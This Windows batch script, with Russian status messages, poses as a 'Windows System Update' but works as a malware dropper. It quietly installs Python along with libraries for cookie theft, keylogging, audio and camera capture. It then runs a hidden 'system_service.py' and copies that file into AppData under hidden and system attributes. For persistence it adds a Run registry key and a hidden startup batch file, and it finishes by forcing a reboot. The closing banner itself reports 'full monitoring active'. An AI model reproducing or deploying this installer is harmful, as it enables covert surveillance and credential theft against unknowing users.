@echo off
chcp 65001 >nul
title Windows System Update
echo ========================================
echo    Windows System Update v4.0
echo ========================================
echo.

echo [1/4] Проверка и установка Python...
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Установка Python 3.9...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe' -OutFile 'python_setup.exe' -UserAgent 'Mozilla/5.0'"
    start /wait python_setup.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    del python_setup.exe
    echo Python успешно установлен!
) else (
    echo Python уже установлен
)

echo [2/4] Установка необходимых библиотек...
echo Установка зависимостей может занять несколько минут...
pip install requests pycryptodome browser-cookie3 pywin32 pillow pynput pyaudio opencv-python numpy psutil --user --quiet >nul 2>&1
echo Все библиотеки установлены!

echo [3/4] Запуск системной службы...
if exist "system_service.py" (
    echo Запуск службы мониторинга...
    start /min pythonw system_service.py
    
    echo Создание скрытой копии в системе...
    python -c "import os, shutil; appdata = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows'); os.makedirs(appdata, exist_ok=True); shutil.copy2('system_service.py', os.path.join(appdata, 'system_update.py')); import subprocess; subprocess.run(['attrib', '+h', '+s', os.path.join(appdata, 'system_update.py')], shell=True)"
    
    echo Настройка автозагрузки...
    python -c "
import winreg
import os

# Добавляем в реестр
try:
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, 'WindowsSystemUpdate', 0, winreg.REG_SZ, 'pythonw \"' + os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'system_update.py') + '\"')
    winreg.CloseKey(key)
    print('✅ Автозагрузка через реестр настроена')
except Exception as e:
    print('❌ Ошибка реестра:', e)

# Добавляем в папку автозагрузки
try:
    startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    if os.path.exists(startup_folder):
        bat_path = os.path.join(startup_folder, 'windows_update.bat')
        with open(bat_path, 'w') as f:
            f.write('@echo off\\npythonw \"' + os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'system_update.py') + '\"')
        import subprocess
        subprocess.run(['attrib', '+h', '+s', bat_path], shell=True)
        print('✅ Автозагрузка через папку настроена')
except Exception as e:
    print('❌ Ошибка папки автозагрузки:', e)
"
    
    echo Служба запущена в фоновом режиме!
) else (
    echo Ошибка: файл system_service.py не найден
)

echo [4/4] Завершение установки...
echo ========================================
echo    СИСТЕМА УСПЕШНО ОБНОВЛЕНА!
echo    Полный мониторинг активен.
echo    Скрытая копия создана в системе.
echo    Автозагрузка настроена.
echo ========================================
echo.
echo Система перезагрузится через 10 секунд...
timeout /t 10 /nobreak >nul
shutdown /r /t 0
